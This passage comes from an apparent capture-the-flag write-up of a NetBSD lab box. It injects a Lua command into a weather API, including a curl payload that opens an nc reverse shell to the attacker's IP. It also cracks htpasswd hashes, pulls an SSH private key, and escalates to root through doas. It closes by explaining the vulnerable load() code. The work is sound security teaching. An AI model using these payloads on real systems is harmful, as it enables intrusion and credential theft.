+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-G</span> <span class="nt">--data-urlencode</span> <span class="s2">"city=') os.execute('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.11 443 &gt;/tmp/f') --"</span> <span class="s1">'http://10.10.10.218/weather/forecast'</span> <span class="nt">-s</span>
+</code></pre></div></div>
+<p>And it connects to a listening <code class="language-plaintext highlighter-rouge">nc</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">listening on [any] 443 ...
+connect to [10.10.14.11] from (UNKNOWN) [10.10.10.218] 65453
+sh: can't access tty; job control turned off
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=24(_httpd) gid=24(_httpd) groups=24(_httpd)
+</span></code></pre></div></div>
+<h2 id="shell-as-rmichaels">Shell as r.michaels</h2>
+<h3 id="enumeration">Enumeration</h3>
+<h4 id="web">Web</h4>
+<p>In the web root there are three files:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">pwd</span>  
+<span class="go">/var/www
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="go">total 20
+drwxr-xr-x   2 root  wheel  512 Nov 25 11:27 .
+drwxr-xr-x  24 root  wheel  512 Nov 24 09:55 ..
+-rw-r--r--   1 root  wheel   47 Sep 16  2020 .htpasswd
+-rw-r--r--   1 root  wheel  386 Sep 17  2020 index.html
+-rw-r--r--   1 root  wheel   78 Nov 25 11:38 robots.txt
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">index.html</code> has a page I wasn’t able to access without auth:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!doctype html&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+  <span class="nt">&lt;head&gt;</span>
+    <span class="nt">&lt;title&gt;</span>Index<span class="nt">&lt;/title&gt;</span>
+  <span class="nt">&lt;/head&gt;</span>
+  <span class="nt">&lt;body&gt;</span>
+    <span class="nt">&lt;p&gt;&lt;h3&gt;</span>Weather Forecast API<span class="nt">&lt;/h3&gt;&lt;/p&gt;</span>
+    <span class="nt">&lt;p&gt;&lt;h4&gt;</span>List available cities:<span class="nt">&lt;/h4&gt;&lt;/p&gt;</span>
+    <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/weather/forecast?city=list"</span><span class="nt">&gt;</span>/weather/forecast?city=list<span class="nt">&lt;/a&gt;</span>
+    <span class="nt">&lt;p&gt;&lt;h4&gt;</span>Five day forecast (London)<span class="nt">&lt;/h4&gt;&lt;/p&gt;</span>
+    <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/weather/forecast?city=London"</span><span class="nt">&gt;</span>/weather/forecast?city=London<span class="nt">&lt;/a&gt;</span>
+    <span class="nt">&lt;hr&gt;</span>
+  <span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">robots.txt</code> is the same as noted in the <code class="language-plaintext highlighter-rouge">nmap</code>. <code class="language-plaintext highlighter-rouge">.htpasswd</code> is interesting. This is the file that defines the basic auth requirement:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
+</code></pre></div></div>
+<p>Starting with <code class="language-plaintext highlighter-rouge">$1$</code> suggests this is a simple md5crypt hash (can verify in the <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">Hashcat list of example hashes</a>). Hashcat breaks it instantly with <code class="language-plaintext highlighter-rouge">hashcat -m 500 htpasswd --user /usr/share/wordlists/rockyou.txt</code> to <code class="language-plaintext highlighter-rouge">iamthebest</code>.</p>
+<p>Using those creds, I can now load <code class="language-plaintext highlighter-rouge">http://10.10.10.218</code>:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210325131747107.webp" type="image/webp"/>
+<img alt="image-20210325131747107" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210325131747107.png"/>
+</picture>
+<p>This doesn’t really give anything new other than links back to the API I already exploited.</p>
+<p>I did take a look at the Lua script, which is interesting, but not necessary for privesc (check out <a href="#beyond-root---lua-injection">Beyond Root</a>).</p>
+<h4 id="users">Users</h4>
+<p>There’s only one user on the box, r.michaels:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /home
+<span class="go">total 4
+dr-xr-x---  7 r.michaels  users  512 Sep 16  2020 r.michaels
+</span></code></pre></div></div>
+<p>_http can’t access this directory. But it seems like this user is a good next target.</p>
+<p>There’s a single process in the process list that’s running as r.michaels:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>ps auxww | <span class="nb">grep </span>michaels
+<span class="go">r.michaels  185  0.0  0.0  35028  1980 ?     Is    3:33PM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /home/r.michaels/devel/webapi/weather.lua -P /var/run/httpd_devel.pid -U r.michaels -b /home/r.michaels/devel/www 
+</span></code></pre></div></div>
+<p>It looks very similar to the <code class="language-plaintext highlighter-rouge">httpd</code> process above, but this one is running a different <code class="language-plaintext highlighter-rouge">weather.lua</code> script, listening on TCP 3001 (instead of 3000), and serving out of <code class="language-plaintext highlighter-rouge">/home/r.michaels/devel/www</code>.</p>
+<h3 id="exploit-dev-weather-api-fail">Exploit Dev Weather API [Fail]</h3>
+<p>Is this vulnerable to the same exploit? I can access it from this shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>curl <span class="nt">-s</span> http://127.0.0.1:3001/weather/forecast?city<span class="o">=</span>list
+<span class="go">{"code": 200,"cities": ["London","Manchester","Birmingham","Leeds","Glasgow","Southampton","Liverpool","Newcastle","Nottingham","Sheffield","Bristol","Belfast","Leicester"]}
+</span></code></pre></div></div>
+<p>It looks like this version is not vulnerable to the command injection as before:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>curl <span class="nt">-s</span> <span class="nt">-G</span> http://127.0.0.1:3001/weather/forecast <span class="nt">--data-urlencode</span> <span class="s2">"city=') os.execute('id') --"</span>
+<span class="go">{"code": 500,"error": "unknown city: ') os.execute('id') --"}
+</span></code></pre></div></div>
+<p>I looked through the Lua script for places where there might have been a more difficult to guess vulnerability, but didn’t see anything (at least not with my limited Lua experience).</p>
+<h3 id="homedir-read">HomeDir Read</h3>
+<p>I remember thinking it was a bit weird to see <code class="language-plaintext highlighter-rouge">-u</code> in the <code class="language-plaintext highlighter-rouge">httpd</code> command line. This makes the public folders in a users homedirectory web accessible. I didn’t have a username when I started poking at this service, but I do now.</p>
+<p>Trying to access <code class="language-plaintext highlighter-rouge">/~r.michaels/</code> returns 401:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>curl <span class="nt">-s</span> http://127.0.0.1:3001/~r.michaels/
+<span class="gp">&lt;html&gt;</span>&lt;<span class="nb">head</span><span class="o">&gt;</span>&lt;title&gt;401 Unauthorized&lt;/title&gt;&lt;/head&gt;
+<span class="gp">&lt;body&gt;</span>&lt;h1&gt;401 Unauthorized&lt;/h1&gt;
+<span class="gp">~r.michaels//: &lt;pre&gt;</span>No authorization&lt;/pre&gt;
+<span class="gp">&lt;hr&gt;</span>&lt;address&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"//127.0.0.1:3001/"</span><span class="o">&gt;</span>127.0.0.1:3001&lt;/a&gt;&lt;/address&gt;
+<span class="gp">&lt;/body&gt;</span>&lt;/html&gt;
+</code></pre></div></div>
+<p>I can add in the creds from the <code class="language-plaintext highlighter-rouge">.htpasswd</code> file and they work:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ curl -s http://127.0.0.1:3001/~r.michaels/ -u webapi_user:iamthebest
+<span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html&gt;&lt;head&gt;&lt;meta</span> <span class="na">charset=</span><span class="s">"utf-8"</span><span class="nt">/&gt;</span>
+<span class="nt">&lt;style </span><span class="na">type=</span><span class="s">"text/css"</span><span class="nt">&gt;</span>
+<span class="nt">table</span> <span class="p">{</span>
+        <span class="nl">border-top</span><span class="p">:</span> <span class="m">1px</span> <span class="nb">solid</span> <span class="no">black</span><span class="p">;</span>
+        <span class="nl">border-bottom</span><span class="p">:</span> <span class="m">1px</span> <span class="nb">solid</span> <span class="no">black</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="nt">th</span> <span class="p">{</span> <span class="nl">background</span><span class="p">:</span> <span class="no">aquamarine</span><span class="p">;</span> <span class="p">}</span>
+<span class="nt">tr</span><span class="nd">:nth-child</span><span class="o">(</span><span class="nt">even</span><span class="o">)</span> <span class="p">{</span> <span class="nl">background</span><span class="p">:</span> <span class="no">lavender</span><span class="p">;</span> <span class="p">}</span>
+<span class="nt">&lt;/style&gt;</span>
+<span class="nt">&lt;title&gt;</span>Index of ~r.michaels/<span class="nt">&lt;/title&gt;&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;&lt;h1&gt;</span>Index of ~r.michaels/<span class="nt">&lt;/h1&gt;</span>
+<span class="nt">&lt;table</span> <span class="na">cols=</span><span class="s">3</span><span class="nt">&gt;</span>
+<span class="nt">&lt;thead&gt;</span>
+<span class="nt">&lt;tr&gt;&lt;th&gt;</span>Name<span class="nt">&lt;th&gt;</span>Last modified<span class="nt">&lt;th</span> <span class="na">align=</span><span class="s">right</span><span class="nt">&gt;</span>Size
+<span class="nt">&lt;tbody&gt;</span>
+<span class="nt">&lt;tr&gt;&lt;td&gt;&lt;a</span> <span class="na">href=</span><span class="s">"../"</span><span class="nt">&gt;</span>Parent Directory<span class="nt">&lt;/a&gt;&lt;td&gt;</span>16-Sep-2020 18:20<span class="nt">&lt;td</span> <span class="na">align=</span><span class="s">right</span><span class="nt">&gt;</span>1kB
+<span class="nt">&lt;tr&gt;&lt;td&gt;&lt;a</span> <span class="na">href=</span><span class="s">"id_rsa"</span><span class="nt">&gt;</span>id_rsa<span class="nt">&lt;/a&gt;&lt;td&gt;</span>16-Sep-2020 16:52<span class="nt">&lt;td</span> <span class="na">align=</span><span class="s">right</span><span class="nt">&gt;</span>3kB
+<span class="nt">&lt;/table&gt;</span>
+<span class="nt">&lt;/body&gt;&lt;/html&gt;</span>
+</code></pre></div></div>
+<p>Directory listing is enabled (<code class="language-plaintext highlighter-rouge">-X</code> in the command line), and this shows a single file, <code class="language-plaintext highlighter-rouge">id_rsa</code>. One more <code class="language-plaintext highlighter-rouge">curl</code> returns the private key:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>curl <span class="nt">-s</span> http://127.0.0.1:3001/~r.michaels/id_rsa <span class="nt">-u</span> webapi_user:iamthebest
+<span class="go">-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAvXxJBbm4VKcT2HABKV2Kzh9GcatzEJRyvv4AAalt349ncfDkMfFB
+...[snip]...
+</span></code></pre></div></div>
+<p>A note - This is not reading the private key from the users <code class="language-plaintext highlighter-rouge">~/.ssh</code> directory. For some reason, the user must have put their private key intentionally in their <code class="language-plaintext highlighter-rouge">~/public_html</code> directory. Perhaps they figured since it’s only on localhost it was less at risk there. Then again, it’s not clear what use it provides the user there either.</p>
+<h3 id="shell-via-ssh">Shell via SSH</h3>
+<p>With a copy of this key, I can get a shell as r.michaels:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>ssh <span class="nt">-i</span> ~/keys/luanne-r.michaels r.michaels@10.10.10.218
+<span class="go">Last login: Fri Sep 18 07:06:51 2020
+NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020
+
+Welcome to NetBSD!
+
+</span><span class="gp">luanne$</span><span class="w">
+</span></code></pre></div></div>
+<p>And grab <code class="language-plaintext highlighter-rouge">user.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">luanne$</span><span class="w"> </span><span class="nb">cat </span>user.txt
+<span class="go">ea5f0ce6************************
+</span></code></pre></div></div>
+<h2 id="shell-as-root">Shell as root</h2>
+<h3 id="doas">doas</h3>
+<p><code class="language-plaintext highlighter-rouge">sudo -l</code> is the first thing I check on Linux hosts. The equivalent on BSD is <code class="language-plaintext highlighter-rouge">doas</code>. The configuration file is a bit buried:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">luanne$</span><span class="w"> </span>find / <span class="nt">-name</span> doas.conf 2&gt;/dev/null
+<span class="go">/usr/pkg/etc/doas.conf
+</span></code></pre></div></div>
+<p>But it says that this user can run anything as root:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">luanne$</span><span class="w"> </span><span class="nb">cat</span> /usr/pkg/etc/doas.conf
+<span class="go">permit r.michaels as root
+</span></code></pre></div></div>
+<p>Unfortunately, it requires a password:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">luanne$</span><span class="w"> </span>doas sh
+<span class="go">Password:
+doas: authentication failed
+</span></code></pre></div></div>
+<h3 id="find-backup">Find Backup</h3>
+<p>In the current homedir, there are three folders:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">luanne$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">backups     devel       public_html user.txt
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">devel</code> has the code for the new version of the API. <code class="language-plaintext highlighter-rouge">public_html</code> just has the SSH key. <code class="language-plaintext highlighter-rouge">backups</code> is interesting, holding what looks like an encrypted Tar archive:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">luanne$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> backups/
+<span class="go">total 4
+-r--------  1 r.michaels  users  1970 Nov 24 09:25 devel_backup-2020-09-16.tar.gz.enc
+</span><span class="gp">luanne$</span><span class="w"> </span>file backups/devel_backup-2020-09-16.tar.gz.enc
+<span class="go">backups/devel_backup-2020-09-16.tar.gz.enc: data
+</span></code></pre></div></div>
+<h3 id="decrypt">Decrypt</h3>
+<p>Looking around the box for any hint about what could be used to decrypt this data, I noticed a <code class="language-plaintext highlighter-rouge">.gnupg</code>  directory in r.michael’s home directory, and it contains keyrings:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">luanne$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /home/r.michaels/.gnupg/
+<span class="go">total 8
+-rw-------  1 r.michaels  users   603 Sep 14  2020 pubring.gpg
+-rw-------  1 r.michaels  users  1291 Sep 14  2020 secring.gpg
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">netpgp</code> is installed on the box, and it decrypts the file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">luanne$</span><span class="w"> </span>netpgp <span class="nt">--decrypt</span> <span class="nt">--output</span><span class="o">=</span>/tmp/0xdf.tar.gz backups/devel_backup-2020-09-16.tar.gz.enc
+<span class="go">signature  2048/RSA (Encrypt or Sign) 3684eb1e5ded454a 2020-09-14 
+Key fingerprint: 027a 3243 0691 2e46 0c29 9f46 3684 eb1e 5ded 454a 
+</span><span class="gp">uid              RSA 2048-bit key &lt;r.michaels@localhost&gt;</span><span class="w">
+</span><span class="go">
+</span><span class="gp">luanne$</span><span class="w"> </span>file /tmp/0xdf.tar.gz
+<span class="go">/tmp/0xdf.tar.gz: gzip compressed data, last modified: Tue Nov 24 09:18:51 2020, from Unix, original size modulo 2^32 12288
+</span></code></pre></div></div>
+<h3 id="backup-analysis">Backup Analysis</h3>
+<p>The file decompresses to contain familiar files at this point:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">luanne$</span><span class="w"> </span><span class="nb">tar </span>zxvf 0xdf.tar.gz
+<span class="go">x devel-2020-09-16/
+x devel-2020-09-16/www/
+x devel-2020-09-16/webapi/
+x devel-2020-09-16/webapi/weather.lua
+x devel-2020-09-16/www/index.html
+x devel-2020-09-16/www/.htpasswd
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">weather.lua</code> is exactly the same as the public version. <code class="language-plaintext highlighter-rouge">index.html</code> is also similar. The <code class="language-plaintext highlighter-rouge">.htpasswd</code> file is different:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">luanne$</span><span class="w"> </span><span class="nb">cat </span>devel-2020-09-16/www/.htpasswd
+<span class="gp">webapi_user:$</span>1<span class="nv">$6xc7I</span>/LW<span class="nv">$WuSQCS6n3yXsjPMSmwHDu</span><span class="nb">.</span>
+</code></pre></div></div>
+<p>It breaks the same way (<code class="language-plaintext highlighter-rouge">hashcat -m 500 htpasswd2 --user /usr/share/wordlists/rockyou.txt</code>), this time to the password <code class="language-plaintext highlighter-rouge">littlebear</code>.</p>
+<h3 id="doas-sh">doas sh</h3>
+<p>Now with a potential password, I can try to <code class="language-plaintext highlighter-rouge">doas</code> as root, and it works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">luanne$</span><span class="w"> </span>doas sh
+<span class="go">Password:
+</span><span class="gp">#</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=0(root) gid=0(wheel) groups=0(wheel),2(kmem),3(sys),4(tty),5(operator),20(staff),31(guest),34(nvmm)
+</span></code></pre></div></div>
+<p>And I can grab the root flag:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span><span class="w"> </span><span class="nb">cat </span>root.txt
+<span class="go">7a9b5c20************************
+</span></code></pre></div></div>
+<h2 id="beyond-root---lua-injection">Beyond Root - Lua Injection</h2>
+<h3 id="code-overview">Code Overview</h3>
+<p>I pretty much a noob at Lua, so of course I knew I wanted to understand how this script worked, and how I could inject into it, comparing the <a href="/files/htb-luanne-weather.lua">vulnerable version</a> to the <a href="/files/htb-luanne-weather-dev.lua">patched</a>.</p>
+<p>The general structure of the program looks like:</p>
+<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">httpd</span> <span class="o">=</span> <span class="nb">require</span> <span class="s1">'httpd'</span>
+<span class="n">math</span> <span class="o">=</span> <span class="nb">require</span> <span class="s1">'math'</span>
+<span class="n">sqlite</span> <span class="o">=</span> <span class="nb">require</span> <span class="s1">'sqlite'</span>
+
+<span class="n">cities</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"London"</span><span class="p">,</span> <span class="s2">"Manchester"</span><span class="p">,</span> <span class="s2">"Birmingham"</span><span class="p">,</span> <span class="s2">"Leeds"</span><span class="p">,</span> <span class="s2">"Glasgow"</span><span class="p">,</span> <span class="s2">"Southampton"</span><span class="p">,</span> <span class="s2">"Liverpool"</span><span class="p">,</span> <span class="s2">"Newcastle"</span><span class="p">,</span> <span class="s2">"Nottingham"</span><span class="p">,</span> <span class="s2">"Sheffield"</span><span class="p">,</span> <span class="s2">"Bristol"</span><span class="p">,</span> <span class="s2">"Belfast"</span><span class="p">,</span> <span class="s2">"Leicester"</span><span class="p">}</span>
+
+<span class="n">weather_desc</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"sunny"</span><span class="p">,</span> <span class="s2">"cloudy"</span><span class="p">,</span> <span class="s2">"partially cloudy"</span><span class="p">,</span> <span class="s2">"rainy"</span><span class="p">,</span> <span class="s2">"snowy"</span><span class="p">}</span>
+
+
+<span class="k">function</span> <span class="nf">valid_city</span><span class="p">(</span><span class="n">cities</span><span class="p">,</span> <span class="n">city</span><span class="p">)</span>
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
+<span class="k">end</span>
+
+
+<span class="k">function</span> <span class="nf">forecast</span><span class="p">(</span><span class="n">env</span><span class="p">,</span> <span class="n">headers</span><span class="p">,</span> <span class="n">query</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">query</span> <span class="ow">and</span> <span class="n">query</span><span class="p">[</span><span class="s2">"city"</span><span class="p">]</span>
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
+<span class="k">end</span>
+
+<span class="n">httpd</span><span class="p">.</span><span class="n">register_handler</span><span class="p">(</span><span class="s1">'forecast'</span><span class="p">,</span> <span class="n">forecast</span><span class="p">)</span>
+</code></pre></div></div>
+<p>It loads some modules, defines some constants and two functions, and then calls <code class="language-plaintext highlighter-rouge">register_handler</code>. This is actually mentioned on the <a href="https://www.daemon-systems.org/man/httpd.8.html">httpd man page</a>:</p>
+<blockquote>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>     -L prefix script
+                Adds a new Lua script for a particular prefix.  The prefix
+                should be an arbitrary text, and the script should be a full
+                path to a Lua script.  Multiple -L options may be passed.  A
+                separate Lua state is created for each prefix.  The Lua script
+                can register callbacks using the
+                httpd.register_handler('&lt;name&gt;', function) Lua function, which
+                will trigger the execution of the Lua function function when a
+                URL in the form http://&lt;hostname&gt;/&lt;prefix&gt;/&lt;name&gt; is being
+                accessed.  The function is passed three tables as arguments,
+                the server environment, the request headers, and the decoded
+                query string plus any data that was sent as application/x-www-
+                form-urlencoded.
+</code></pre></div> </div>
+</blockquote>
+<p>So this is how <code class="language-plaintext highlighter-rouge">/weather/forecast</code> gets to the script, and then it is passed to the function <code class="language-plaintext highlighter-rouge">forecast</code>.</p>
+<p>The <code class="language-plaintext highlighter-rouge">valid_city</code> function just checks if a string is in the list. The <code class="language-plaintext highlighter-rouge">forecast</code> function is where the injection is.</p>
+<p>It starts by checking for the <code class="language-plaintext highlighter-rouge">city</code> parameter, and if it’s not there, it writes the message I first got on visiting the API:</p>
+<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="nf">forecast</span><span class="p">(</span><span class="n">env</span><span class="p">,</span> <span class="n">headers</span><span class="p">,</span> <span class="n">query</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">query</span> <span class="ow">and</span> <span class="n">query</span><span class="p">[</span><span class="s2">"city"</span><span class="p">]</span>
+    <span class="k">then</span>
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
+    <span class="k">else</span>
+        <span class="n">httpd</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s2">"HTTP/1.1 200 Ok\r\n"</span><span class="p">)</span>
+        <span class="n">httpd</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s2">"Content-Type: application/json\r\n\r\n"</span><span class="p">)</span>
+        <span class="n">httpd</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="s1">'{"code": 200, "message": "No city specified. Use \'</span><span class="n">city</span><span class="o">=</span><span class="n">list</span><span class="err">\</span><span class="s1">' to list available cities."}'</span><span class="p">)</span>
+    <span class="k">end</span>
+<span class="k">end</span>
+</code></pre></div></div>
+<p>Back inside that snip above, it checks if <code class="language-plaintext highlighter-rouge">city=list</code>, and if so, generates the list of cities as a JSON string, writing it with <code class="language-plaintext highlighter-rouge">http.write</code>:</p>
+<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="kd">local</span> <span class="n">city</span> <span class="o">=</span> <span class="n">query</span><span class="p">[</span><span class="s2">"city"</span><span class="p">]</span>
+        <span class="k">if</span> <span class="n">city</span> <span class="o">==</span> <span class="s2">"list"</span>
+        <span class="k">then</span> 
+            <span class="n">httpd</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s2">"HTTP/1.1 200 Ok\r\n"</span><span class="p">)</span>
+            <span class="n">httpd</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s2">"Content-Type: application/json\r\n\r\n"</span><span class="p">)</span>
+            <span class="n">httpd</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s1">'{"code": 200,'</span><span class="p">)</span>
+            <span class="n">httpd</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s1">'"cities": ['</span><span class="p">)</span>
+            <span class="k">for</span> <span class="n">k</span><span class="p">,</span><span class="n">v</span> <span class="k">in</span> <span class="nb">pairs</span><span class="p">(</span><span class="n">cities</span><span class="p">)</span> <span class="k">do</span>
+                <span class="n">httpd</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s1">'"'</span> <span class="o">..</span> <span class="n">v</span> <span class="o">..</span> <span class="s1">'"'</span><span class="p">)</span>
+                <span class="k">if</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="o">#</span><span class="n">cities</span>
+                <span class="k">then</span>
+                    <span class="n">httpd</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s1">','</span><span class="p">)</span>
+                <span class="k">end</span>
+            <span class="k">end</span>                                  
+            <span class="n">httpd</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s1">']}'</span><span class="p">)</span>                        
+</code></pre></div></div>
+<p>If <code class="language-plaintext highlighter-rouge">city</code> is not <code class="language-plaintext highlighter-rouge">list</code> and it’s not a valid city, then it jumps into the error message creation:</p>
+<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="k">elseif</span> <span class="ow">not</span> <span class="n">valid_city</span><span class="p">(</span><span class="n">cities</span><span class="p">,</span> <span class="n">city</span><span class="p">)</span>                           
+        <span class="k">then</span>                                                            
+            <span class="c1">-- city=London') os.execute('id') --  </span>
+            <span class="n">httpd</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s2">"HTTP/1.1 500 Error\r\n"</span><span class="p">)</span>    
+            <span class="n">httpd</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s2">"Content-Type: application/json\r\n\r\n"</span><span class="p">)</span>
+            <span class="kd">local</span> <span class="n">json</span> <span class="o">=</span> <span class="nb">string.format</span><span class="p">(</span><span class="s">[[             
+                httpd.write('{"code": 500,')                       
+                httpd.write('"error": "unknown city: %s"}')           
+            ]]</span><span class="p">,</span> <span class="n">city</span><span class="p">)</span>                             
+
+            <span class="nb">load</span><span class="p">(</span><span class="n">json</span><span class="p">)()</span>
+        <span class="k">else</span>
+            <span class="c1">-- just some fake weather data</span>
+            <span class="n">weather_data</span> <span class="o">=</span> <span class="p">{</span>
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span> <span class="n">generating</span> <span class="n">random</span> <span class="n">weather</span> <span class="n">data</span><span class="p">]</span><span class="o">...</span>
+        <span class="k">end</span> 
+</code></pre></div></div>
+<p>If it is a valid city, there’s a bunch of code generating random weather JSON.</p>
+<h3 id="vulnerability">Vulnerability</h3>
+<p>The vulnerability is in how the error message JSON is created. First, a string, <code class="language-plaintext highlighter-rouge">json</code> is created using the <code class="language-plaintext highlighter-rouge">string.format</code> function:</p>
+<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">local</span> <span class="n">json</span> <span class="o">=</span> <span class="nb">string.format</span><span class="p">(</span><span class="s">[[             
+    httpd.write('{"code": 500,')                       
+    httpd.write('"error": "unknown city: %s"}')           
+    ]]</span><span class="p">,</span> <span class="n">city</span><span class="p">)</span>  
+</code></pre></div></div>
+<p>So if I pass in <code class="language-plaintext highlighter-rouge">city=0xdf</code>, then <code class="language-plaintext highlighter-rouge">json</code> will be:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>httpd.write('{"code": 500,')
+httpd.write('"error": "unknown city: 0xdf"}')
+</code></pre></div></div>
+<p>With this string built, it will pass that into <code class="language-plaintext highlighter-rouge">load</code>:</p>
+<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">load</span><span class="p">(</span><span class="n">json</span><span class="p">)()</span>
+</code></pre></div></div>
+<p>That is the dangerous part. <code class="language-plaintext highlighter-rouge">load</code> effectively loads the string into memory as Lua commands, and then the <code class="language-plaintext highlighter-rouge">()</code> runs that. It’s kind of like calling <code class="language-plaintext highlighter-rouge">eval</code> on a string in Python (also dangerous).</p>
+<p>In the dev version of this script, the error message generation is much cleaner:</p>
+<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">httpd</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s2">"HTTP/1.1 500 Error\r\n"</span><span class="p">)</span>
+<span class="n">httpd</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s2">"Content-Type: application/json\r\n\r\n"</span><span class="p">)</span>
+<span class="n">httpd</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s1">'{"code": 500,'</span><span class="p">)</span>
